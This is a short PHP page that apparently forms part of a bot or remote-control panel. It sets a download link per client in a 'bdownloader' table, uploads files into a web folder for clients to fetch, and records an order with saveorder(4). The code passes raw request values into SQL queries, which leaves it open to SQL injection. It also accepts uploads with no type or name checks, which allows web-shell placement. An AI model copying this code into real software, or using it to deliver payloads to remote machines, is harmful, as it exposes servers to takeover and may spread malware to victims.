<?php
	include("chk.php");
?>
<?php

	if(isset($_POST['download']))
	{
				include("pinc-nullorder.php");
				include("../config.php");
				saveorder(4);
				$con=mysqli_connect($host,$user,$pass,$db);
					mysqli_query($con,"update bdownloader set slink='".$_POST['downloadlink']."' where sname='".$_GET['user']."'");
				mysqli_close($con);
	}
	if(isset($_FILES['upload']))
	{
		$dir=getcwd();
	
		$upload=$dir."/files/downloader/".basename($_FILES['upload']['name']);
		if (move_uploaded_file($_FILES['upload']['tmp_name'],$upload)) 
		{
				include("pinc-nullorder.php");
				include("../config.php");
				saveorder(4);
				$con=mysqli_connect($host,$user,$pass,$db);
					mysqli_query($con,"update bdownloader set slink='".$_SERVER["SERVER_NAME"].dirname($_SERVER['PHP_SELF'])."/files/downloader/".$_FILES["upload"]["name"]."' where sname='".$_GET['user']."'");
				mysqli_close($con);
		}
	}	
	function showlink()
	{
					include("../config.php");
					$con=mysql_connect($host,$user,$pass);
					mysql_select_db($db,$con);
					$sel=mysql_query("select * from bdownloader where sname='".$_GET['user']."'");
					$row=mysql_fetch_array($sel);
					echo $row['slink'];
	}
?>
<br>
<br>
<br>
<br>
<form action="" method="post" enctype="multipart/form-data">
<label>Link :</label>
	<input type="text" class="form-control" style="width:86%" name="downloadlink" value="<?php showlink();?>">
		<input class="btn btn-primary" type="submit" value="Download" name="download">
<br>
<br>
<label>Upload :</label>
		<input type="file" class="btn btn-Default" style="width:100%" name="upload"/>
			<input type="submit" class="btn btn-Default" value="Upload" style="width:100%">
</form>

